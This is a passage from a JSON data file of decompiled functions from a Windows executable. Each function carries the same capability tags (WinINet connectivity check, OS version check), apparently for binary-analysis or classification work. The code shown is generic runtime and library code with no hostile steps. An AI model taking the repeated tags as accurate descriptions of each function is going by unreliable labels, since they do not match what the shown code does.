0x48e7ce\n        switch(iVar8) {\n        case 0x50:\n            puVar10 = *0x56f458 + 1;\n            *0x56f458 = puVar1;\n            fcn.004022a2(*puVar10 * 8 + 0x54e820);\n            ppiVar6 = fcn.00402d83(&var_20h, 0, NULL);\n            var_18h = *ppiVar6;\n            var_14h = ppiVar6[1];\n            puVar10 = *0x56f458;\n            if ((var_18h == NULL) || ((var_14h & 0x400) == 0)) {\ncode_r0x0048e64b:\n                *0x56f458 = puVar10;\n                fcn.004052f9(arg_8h, &var_18h);\n                return arg_8h;\n            }\n            break;\n        case 0x51:\n            goto code_r0x0048e689;\n        case 0x52:\n            puVar10 = *0x56f458 + 1;\n            *0x56f458 = puVar1;\n            fcn.004022a2(*puVar10 * 8 + 0x54e820);\n            if (**0x56f458 == 0) {\n                fcn.004061ef(arg_8h, 1);\n                return arg_8h;\n            }\n            uVar7 = **0x56f458 - 0x30;\n            puVar10 = *0x56f458;\n            if ((-1 < uVar7) && (uVar7 < 5)) {\n                fcn.004022a2(uVar7 * 8 + 0x54eb60);\n                uVar2 = **0x56f458;\n                puVar10 = *0x56f458 + 1;\n                if (uVar2 == 0x30) {\n                    *0x56f458 = puVar10;\n                    fcn.00404bf6(&var_20h, 0);\n                    var_10h = var_20h;\n                    var_ch = var_1ch;\n                    fcn.00403cba(0x20);\n                    fcn.004052f9(&var_28h, &var_8h);\n                    puVar10 = *0x56f458;\n                }\n                else {\n                    if (uVar2 == 0x31) {\n                        var_10h = var_8h;\n                        var_ch = var_4h;\n                        *0x56f458 = puVar10;\n                        fcn.00402eb9(&var_18h);\n                        fcn.0040622b(&var_20h);\n                        uVar5 = fcn.004032bf(&var_18h, 0x2c);\n                        fcn.00402eb9(uVar5);\n                        fcn.0040622b(&var_20h);\n                        uVar5 = fcn.004032bf(&var_18h, 0x2c);\n                        fcn.00402eb9(uVar5);\n                        fcn.0040622b(&var_20h);\n                        uVar5 = fcn.004032bf(&var_18h, 0x2c);\n                        fcn.00402eb9(uVar5);\n                        fcn.00403535(&var_20h, 0);\n                        uVar5 = fcn.004032bf(&var_18h, 0x29);\n                        fcn.00402eb9(uVar5);\n                        fcn.004032bf(arg_8h, 0x27);\n                        return arg_8h;\n                    }\n                    if (((uVar2 != 0x32) && (uVar2 != 0x33)) && (puVar1 = *0x56f458,  uVar2 != 0x34))\n                    goto code_r0x0048e244;\n                }\n                goto code_r0x0048e64b;\n            }\n            break;\n        case 0x55:\n        case 0x56:\n            iVar8 = (*0x56f458)[1] * 8 + 0x54e820;\n            *0x56f458 = puVar1;\n            goto code_r0x0048e663;\n        case 0x57:\n        case 0x5a:\n        case 0x5b:\n        case 0x5c:\n        case 0x5d:\n        case 0x5e:\n            break;\n        case 0x5f:\n            puVar10 = *0x56f458 + 3;\n    // switch table (14 cases) at 0x48e802\n            switch(*puVar1) {\n            case 0x41:\n            case 0x42:\n            case 0x43:\n            case 0x44:\n            case 0x47:\n            case 0x48:\n            case 0x49:\n            case 0x4a:\n            case 0x4c:\n            case 0x4d:\n                iVar8 = (*0x56f458)[2] * 8 + 0x54e8e8;\n                *0x56f458 = puVar10;\n                goto code_r0x0048e395;\n            case 0x45:\n            case 0x46:\n                puVar1 = *0x56f458 + 2;\n                *0x56f458 = puVar10;\n                fcn.00402cfc(*puVar1 * 8 + 0x54e8e8);\n                if (**0x56f458 == 0x3f) {\n                    uVar5 = fcn.00401d20(&var_28h);\n                    fcn.00402eb9(uVar5);\n                    if (**0x56f458 == 0x40) {\n                        *0x56f458 = *0x56f458 + 1;\n                    }\n                }\n                else {\n                    uVar5 = fcn.00401474(&var_28h);\n                    fcn.00402eb9(uVar5);\n                }\n                var_20h = 0x54f3dc;\n                var_1ch = 0x2;\n                fcn.00405c95(&var_20h);\n                goto code_r0x0048e736;\n            case 0x4b:\n                puVar1 = *0x56f458 + 2;\n                *0x56f458 = puVar10;\n                uVar7 = fcn.00402cfc(*puVar1 * 8 + 0x54e8e8);\n                while( true ) {\n                    uVar2 = **0x56f458;\n                    if (uVar2 == 0) break;\n                    if (uVar2 == 0x40) {\n                        *0x56f458 = *0x56f458 + 1;\n                        break;\n                    }\n                    *0x56f458 = *0x56f458 + 1;\n                    uVar7 = fcn.00403cba(uVar7 & 0xffffff00 | uVar2);\n                }\ncode_r0x0048e736:\n                *arg_8h = var_18h;\n                var_ch = var_14h;\ncode_r0x0048e1c2:\n                arg_8h[1] = var_ch;\n                return arg_8h;\n            case 0x4e:\n                *0x56f458 = *0x56f458 + 4;\n                puVar10 = *0x56f458;\n                if (*puVar10 == 0x32) {\n                    fcn.004067bc(arg_8h);\n                    return arg_8h;\n                }\n            }\n            break;\n        default:\n            if (iVar8 != 0x47) {\n                if (iVar8 < 0x39) {\n                    if (iVar8 == 0x38) {\ncode_r0x0048e38a:\n                        iVar8 = (*0x56f458)[1] * 8 + 0x54e858;\n                        *0x56f458 = puVar1;\n                        goto code_r0x0048e395;\n                    }\n                    if (iVar8 < 0x34) {\n                        if (iVar8 != 0x33) {\n                            if (iVar8 == 0) {\n                                puVar1 = *0x56f458 + 1;\ncode_r0x0048e244:\n                                *0x56f458 = puVar1;\n                                fcn.004017df(1);\n                                return arg_8h;\n                            }\n                            if (((iVar8 != 0x30) && (iVar8 != 0x31)) && (iVar8 != 0x32)) break;\n                        }\n                    }\n                    else if (((iVar8 != 0x34) && (iVar8 != 0x35)) && (iVar8 != 0x36)) {\n                        if (iVar8 != 0x37) break;\n                        goto code_r0x0048e38a;\n                    }\n                    iVar8 = (*0x56f458)[1] * 8 + 0x54e858;\n                    *0x56f458 = puVar1;\n                    goto code_r0x0048e274;\n                }\n                if (iVar8 < 0x44) {\n                    if (iVar8 == 0x43) {\n                        *0x56f458 = puVar1;\n                        fcn.004034db(&var_18h, 0);\n                        var_4h = var_14h | 0x1000;\n                        var_8h = var_18h;\ncode_r0x0048e230:\n                        *arg_8h = var_8h;\n                        arg_8h[1] = var_4h;\n                        return arg_8h;\n                    }\n                    if (iVar8 == 0x39) {\n                        puVar10 = *0x56f458 + 1;\n                        *0x56f458 = puVar1;\n                        fcn.00402cfc(*puVar10 * 8 + 0x54e858);\n                        var_4h = var_14h | 0x8000;\n                        var_8h = var_18h;\n                        goto code_r0x0048e230;\n                    }\n                    if (iVar8 == 0x3f) {\n                        *0x56f458 = *0x56f458 + 3;\n                        if (*puVar1 != 0) {\n                            if (*puVar1 != 0x30) {\n                                arg_8h[1] = NULL;\n                                *(arg_8h + 1) = 2;\n                                *arg_8h = NULL;\n                                return arg_8h;\n                            }\n                            fcn.004034db(&var_18h, 1);\n                            *arg_8h = var_18h;\n                            arg_8h[1] = var_14h | 0x1000;\n                            return arg_8h;\n                        }\n                        goto code_r0x0048e244;\n                    }\n                    iVar8 = iVar8 + -0x40;\n                }\n                else {\n                    iVar8 = iVar8 + -0x44;\n                    if (iVar8 == 0) goto code_r0x0048e3cb;\n                }\n                if ((iVar8 != 1) && (iVar8 != 2)) break;\n            }\n        case 0x48:\n        case 0x49:\n        case 0x4a:\n        case 0x4b:\n        case 0x4c:\n        case 0x4d:\n        case 0x4e:\n        case 0x4f:\n        case 0x53:\n        case 0x54:\n        case 0x58:\n        case 0x59:\ncode_r0x0048e3cb:\n            iVar8 = (*0x56f458)[1] * 8 + 0x54e820;\n            *0x56f458 = puVar1;\ncode_r0x0048e395:\n            fcn.00402cfc(iVar8);\n            return arg_8h;\n        }\ncode_r0x0048e12f:\n        *0x56f458 = puVar10;\n        arg_8h[1] = NULL;\n        *(arg_8h + 1) = 2;\n        goto code_r0x0048e139;\n    default:\n        if (iVar8 == 0x49) goto code_r0x0048e2d6;\n        if (0x38 < iVar8) {\n            if (iVar8 < 0x45) {\n                if (iVar8 != 0x44) {\n                    if (iVar8 == 0x39) goto code_r0x0048e269;\n                    if (iVar8 != 0x41) {\n                        iVar8 = iVar8 + -0x42;\n                        if (iVar8 != 0) goto code_r0x0048e2cd;\n                        piVar11 = 0x1;\n                    }\n                }\n            }\n            else if (((iVar8 != 0x45) && (iVar8 != 0x46)) && (iVar8 = iVar8 + -0x47,  iVar8 != 0)) {\ncode_r0x0048e2cd:\n                if (iVar8 != 1) goto code_r0x0048e12f;\n            }\n            goto code_r0x0048e2d6;\n        }\n        if (iVar8 != 0x38) {\n            if (iVar8 < 0x34) {\n                if (iVar8 != 0x33) {\n                    puVar1 = *0x56f458;\n                    if (iVar8 == 0) goto code_r0x0048e244;\n                    if ((iVar8 == 0x30) || (iVar8 = iVar8 + -0x31,  iVar8 == 0)) {\n                        var_ch = NULL;\n                        var_10h = NULL;\n                        if (arg_ch != '\\0') {\n                            *0x56f458 = puVar10;\n                            uVar5 = fcn.00403e5e(&var_20h);\n                            uVar5 = fcn.00402e87(&var_18h, 0x3c, uVar5);\n                            fcn.00402eb9(uVar5);\n                            if (var_10h != NULL) {\n                                pcVar3 = *(*var_10h + 8);\n                                (**0x573000)();\n                                cVar4 = (*pcVar3)();\n                                if (cVar4 == '>') {\n                                    fcn.00403cba(0x20);\n                                }\n                            }\n                            fcn.00403cba(0x3e);\n                            if (arg_10h != NULL) {\n                                *arg_10h = 1;\n                            }\n                            if (**0x56f458 == 0) {\n                                *arg_8h = var_10h;\n                                goto code_r0x0048e1c2;\n                            }\n                            puVar10 = *0x56f458 + 1;\n                        }\n                        piVar9 = var_10h;\n                        *0x56f458 = puVar10;\n                        ppiVar6 = fcn.00402919(&var_20h, 0, 0);\n                        var_8h = *ppiVar6;\n                        var_4h = ppiVar6[1];\n                        *0x56f458 = puVar10;\n                        if ((var_8h != NULL) && (puVar10[-1] == 0x31)) {\n                            ppiVar6 = fcn.00402e87(&var_20h, 0x7e, &var_8h);\n                            var_8h = *ppiVar6;\n                            var_4h = ppiVar6[1];\n                        }\n                        if (piVar9 != NULL) {\n                            fcn.00402eb9(&var_10h);\n                        }\n                        goto code_r0x0048e230;\n                    }\ncode_r0x0048e126:\n                    if (iVar8 != 1) goto code_r0x0048e12f;\n                }\n            }\n            else if (((iVar8 != 0x34) && (iVar8 != 0x35)) && (iVar8 = iVar8 + -0x36,  iVar8 != 0))\n            goto code_r0x0048e126;\n        }\ncode_r0x0048e269:\n        iVar8 = **0x56f458 * 8 + 0x54e738;\n        *0x56f458 = puVar10;\ncode_r0x0048e274:\n        fcn.004022a2(iVar8);\ncode_r0x0048e27d:\n        piVar9 = var_4h;\n        piVar11 = var_8h;\n        puVar1 = *0x56f458;\n        if (var_8h != NULL) {\n            var_20h = \"operator\";\n            var_1ch = 0x8;\n            fcn.00402cfc(&var_20h);\n            fcn.004052f9(&var_20h, &var_8h);\n            piVar9 = var_1ch;\n            piVar11 = var_20h;\n            puVar1 = *0x56f458;\n        }\n    }\ncode_r0x0048e689:\n    *0x56f458 = puVar1;\n    arg_8h[1] = piVar9;\ncode_r0x0048e139:\n    *arg_8h = piVar11;\n    return arg_8h;\n}\n",
        "token_count": 4555
    },
    "00402dd3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402dd3(char **arg_8h, char **arg_ch)\n\n{\n    char *pcVar1;\n    char cVar2;\n    char *arg_8h_00;\n    char *pcVar3;\n    char *arg_8h_01;\n    \n    if ((*(arg_8h + 1) == '\\0') || (pcVar3 = *arg_8h,  pcVar3 == NULL)) {\n        *arg_ch = *arg_8h;\n        *(arg_ch + 1) = 0;\n    }\n    else {\n        pcVar1 = pcVar3 + 1;\n        do {\n            cVar2 = *pcVar3;\n            pcVar3 = pcVar3 + 1;\n        } while (cVar2 != '\\0');\n        arg_8h_00 = fcn.0040159b(pcVar3 + (1 - pcVar1));\n        arg_8h_01 = arg_8h_00;\n        if (arg_8h_00 != NULL) {\n            fcn.00405f56(arg_8h_00, pcVar3 + (1 - pcVar1), *arg_8h);\n            arg_8h_01 = NULL;\n            *arg_ch = arg_8h_00;\n            *(arg_ch + 1) = 1;\n        }\n        fcn.004040d9(arg_8h_01);\n    }\n    return;\n}\n",
        "token_count": 320
    },
    "0048f9d1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0048f9d1(uchar *arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_ECX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    \n    if (*(in_ECX + 4) == 1) {\n        arg_ch = arg_ch - arg_8h;\n        iVar1 = 4;\n        if ((3 < arg_ch) || (iVar1 = arg_ch,  arg_ch != 0)) {\n            iVar2 = iVar1;\n            puVar3 = arg_8h;\n            do {\n                *puVar3 = puVar3[0x54f9f4 - arg_8h];\n                puVar3 = puVar3 + 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        arg_8h = arg_8h + iVar1;\n    }\n    return arg_8h;\n}\n",
        "token_count": 218
    },
    "00402e19": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00402e19(void)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    \n    uVar2 = 0;\n    uVar1 = fcn.00401ae6();\n    if (uVar1 == 1) {\n        uVar1 = fcn.004c7fbf();\n        if (uVar1 != 0) {\n            uVar1 = fcn.004c7fdf();\n            if (uVar1 != 0) {\n                uVar2 = 1;\n            }\n        }\n    }\n    return uVar1 & 0xffffff00 | uVar2;\n}\n",
        "token_count": 142
    },
    "00402e3c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00402e3c(uint32_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        uVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            uVar3 = fcn.00403751();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00405eed(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        uVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = uVar1;\n    arg_8h[1] = 0;\n    return 1;\n}\n",
        "token_count": 334
    },
    "00419750": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.00419750(code **param_1, int32_t param_2)\n\n{\n    code **ppcVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    int32_t var_8h;\n    code **var_20h;\n    uint *puStack32;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puStack32 = &var_20h;\n    var_14h = 0x41e3d0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    *param_1 = vtable.std::exception.0;\n    var_10h = 0;\n    var_20h = param_1;\n    fcn.00405a60(param_1 + 1);\n    ppcVar1 = var_20h;\n    if (var_8h != 0) {\n        fcn.00401e7e(var_20h);\n    }\n    *in_FS_OFFSET = var_18h;\n    return ppcVar1;\n}\n",
        "token_count": 253
    },
    "00402e7d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00402e7d(uint32_t *param_1, int32_t param_2, uint32_t param_3)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    int32_t iStack24;\n    uint32_t *puStack20;\n    \n    puStack20 = param_1;\n    iStack24 = param_2;\n    uStack28 = param_3;\n    uStack36 = 0x4890c0;\n    uStack40 = *in_FS_OFFSET;\n    uStack32 = *0x56cca8 ^ &uStack40;\n    *in_FS_OFFSET = &uStack40;\n    while( true ) {\n        uVar2 = *(param_2 + 0xc);\n        if ((uVar2 == 0xfffffffe) || ((param_3 != 0xfffffffe && (uVar2 <= param_3)))) break;\n        puVar1 = (*(param_2 + 8) ^ *param_1) + 0x10 + uVar2 * 0xc;\n        *(param_2 + 0xc) = *puVar1;\n        if (puVar1[1] == 0) {\n            uStack40 = 0x101;\n            fcn.00405e84();\n            fcn.00403bca();\n        }\n    }\n    *in_FS_OFFSET = uStack40;\n    return;\n}\n",
        "token_count": 342
    },
    "00402e8c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402e8c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    in_ECX[1] = 0;\n    *(in_ECX + 1) = arg_8h;\n    if (arg_8h == 1) {\n        iVar1 = fcn.0040487c(1);\n        *in_ECX = iVar1;\n        if (iVar1 == 0) {\n            *(in_ECX + 1) = 3;\n        }\n    }\n    else {\n        *in_ECX = 0;\n    }\n    return;\n}\n",
        "token_count": 144
    },
    "00402e9b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402e9b(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t iVar3;\n    \n    LOCK();\n    *(arg_8h + 0xc) = *(arg_8h + 0xc) + 1;\n    piVar1 = *(arg_8h + 0x7c);\n    if (piVar1 != NULL) {\n        LOCK();\n        *piVar1 = *piVar1 + 1;\n    }\n    piVar1 = *(arg_8h + 0x84);\n    if (piVar1 != NULL) {\n        LOCK();\n        *piVar1 = *piVar1 + 1;\n    }\n    piVar1 = *(arg_8h + 0x80);\n    if (piVar1 != NULL) {\n        LOCK();\n        *piVar1 = *piVar1 + 1;\n    }\n    piVar1 = *(arg_8h + 0x8c);\n    if (piVar1 != NULL) {\n        LOCK();\n        *piVar1 = *piVar1 + 1;\n    }\n    ppiVar2 = arg_8h + 0x28;\n    iVar3 = 6;\n    do {\n        if ((ppiVar2[-2] != 0x56cf60) && (piVar1 = *ppiVar2,  piVar1 != NULL)) {\n            LOCK();\n            *piVar1 = *piVar1 + 1;\n        }\n        if ((ppiVar2[-3] != NULL) && (piVar1 = ppiVar2[-1],  piVar1 != NULL)) {\n            LOCK();\n            *piVar1 = *piVar1 + 1;\n        }\n        ppiVar2 = ppiVar2 + 4;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    fcn.00402d97(*(arg_8h + 0x9c));\n    return;\n}\n",
        "token_count": 449
    },
    "00402ea0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402ea0(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00403819(in_ECX + 0x464 + uVar1 * 0x10, 3, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 298
    },
    "00402eb9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402eb9(int32_t *arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t *in_ECX;\n    \n    if (*(in_ECX + 1) < '\\x02') {\n        arg_8h_00 = *arg_8h;\n        if (*in_ECX == 0) {\n            if (arg_8h_00 == 0) {\n                fcn.00402e8c(*(arg_8h + 1));\n            }\n            else {\n                *in_ECX = arg_8h_00;\n                in_ECX[1] = arg_8h[1];\n            }\n        }\n        else if (arg_8h_00 == 0) {\n            if (*(arg_8h + 1) != 0) {\n                fcn.0040648d(*(arg_8h + 1));\n            }\n        }\n        else {\n            fcn.004012d5(arg_8h_00);\n        }\n    }\n    return;\n}\n",
        "token_count": 230
    },
    "00402f18": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402f18(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    uint32_t var_4h;\n    \n    piVar2 = *(in_ECX + 0xc);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.004039a4();\n        *(in_ECX + 0xc) = piVar2;\n    }\n    iVar1 = *piVar2;\n    *piVar2 = 0;\n    var_4h = 0;\n    uVar3 = fcn.00403607(*(in_ECX + 0x10) + -2, &var_4h, 10);\n    *arg_8h = uVar3;\n    piVar4 = *(in_ECX + 0xc);\n    if (piVar4 == NULL) {\n        piVar4 = fcn.004039a4();\n        *(in_ECX + 0xc) = piVar4;\n    }\n    if ((*piVar4 == 0x22) || (var_4h < *(in_ECX + 0x10))) {\n        uVar3 = 0;\n    }\n    else {\n        *(in_ECX + 0x10) = var_4h;\n        uVar3 = 1;\n    }\n    if ((*piVar2 == 0) && (iVar1 != 0)) {\n        *piVar2 = iVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 355
    },
    "00402f95": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402f95(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n        uVar3 = *(*(in_ECX + 0x14) + -8);\n        arg_8h[1] = *(*(in_ECX + 0x14) + -4);\n        *arg_8h = uVar3;\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.0040288d(in_ECX + 0x464 + uVar1 * 0x10, 4, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        puVar2 = *(in_ECX + 0x46c + uVar1 * 0x10);\n        uVar3 = puVar2[1];\n        *arg_8h = *puVar2;\n        arg_8h[1] = uVar3;\n    }\n    return 1;\n}\n",
        "token_count": 365
    },
    "00402fc7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402fc7(uint32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t arg_ch;\n    int32_t iVar3;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = param_1;\n    if ((*(param_1 + 0x3c) == '\\0') && (iVar3 = 0,  0 < *(param_1 + 0x38))) {\n        arg_ch = *(param_1 + 0x34);\n        do {\n            var_4h = var_4h & 0xffff0000;\n            iVar2 = fcn.0040105f(&var_4h, arg_ch, *(**(param_1 + 8) + 4), *(param_1 + 8));\n            if (iVar2 < 1) {\n                *(param_1 + 0x18) = 0xffffffff;\n                return 1;\n            }\n            cVar1 = fcn.00401708(var_4h);\n            if (cVar1 == '\\0') {\n                *(param_1 + 0x18) = 0xffffffff;\n            }\n            else {\n                *(param_1 + 0x18) = *(param_1 + 0x18) + 1;\n            }\n            arg_ch = arg_ch + iVar2;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 != *(param_1 + 0x38));\n    }\n    else {\n        fcn.00404043(*(param_1 + 0x34), *(param_1 + 0x38), param_1 + 0x18, param_1 + 0xc);\n    }\n    return 1;\n}\n",
        "token_count": 392
    },
    "00402fe0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402fe0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    \n    if (*(param_1 + 4) != 0) {\n        iVar1 = *(param_1 + 8);\n        *(param_1 + 0xc) = iVar1;\n        while (iVar1 != 0) {\n            pcVar2 = *(param_1 + 4);\n            *(param_1 + 8) = **(param_1 + 0xc);\n            (**0x573000)(*(param_1 + 0xc));\n            (*pcVar2)();\n            iVar1 = *(param_1 + 8);\n            *(param_1 + 0xc) = iVar1;\n        }\n    }\n    return;\n}\n",
        "token_count": 174
    },
    "0040303a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0040303a(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    uint uVar7;\n    uint uVar8;\n    int32_t **in_FS_OFFSET;\n    code *apcStack76 [5];\n    uint uStack56;\n    uint uStack52;\n    int32_t *piStack48;\n    int32_t *piStack44;\n    uchar uStack40;\n    int32_t *piStack36;\n    code **ppcStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppcStack32 = apcStack76;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x41e300;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    piVar6 = *(param_1 + *(*param_1 + 4) + 0x38);\n    if (piVar6 == NULL) goto code_r0x004185e1;\n    piStack44 = param_1;\n    (**(*piVar6 + 4))();\n    piStack36 = param_1;\n    if (*(param_1 + *(*param_1 + 4) + 0xc) == 0) {\n        piVar1 = *(param_1 + *(*param_1 + 4) + 0x3c);\n        if ((piVar1 == NULL) || (piVar1 == param_1)) {\n            uStack40 = true;\n        }\n        else {\n            uStack20 = 0;\n            piStack48 = piVar6;\n            fcn.0040303a();\n            uStack40 = *(piStack36 + *(*piStack36 + 4) + 0xc) == 0;\n            piVar6 = piStack48;\n            if (!uStack40) goto code_r0x004185a9;\n        }\n        uStack20 = 3;\n        iVar4 = (**(*piVar6 + 0x34))();\n        if (iVar4 == -1) {\n            iVar4 = *(*piStack36 + 4);\n            uVar5 = *(piStack36 + iVar4 + 0xc) & 0x13 | 4;\n            *(piStack36 + iVar4 + 0xc) = uVar5;\n            uVar2 = *(piStack36 + iVar4 + 0x10);\n            uVar5 = uVar5 & uVar2;\n            if (uVar5 != 0) {\n                uVar7 = 0x5416b6;\n                if ((uVar5 & 2) == 0) {\n                    uVar7 = 0x5416d0;\n                }\n                uVar8 = 0x54169d;\n                if ((uVar2 & 4) == 0) {\n                    uVar8 = uVar7;\n                }\n                fcn.00404372(&uStack56, 1);\n                fcn.00405ed4(uStack56, uStack52, uVar8);\n                apcStack76[0] = vtable.std::ios_base::failure.0;\n                fcn.004066d1(apcStack76, 0x560cfc);\n                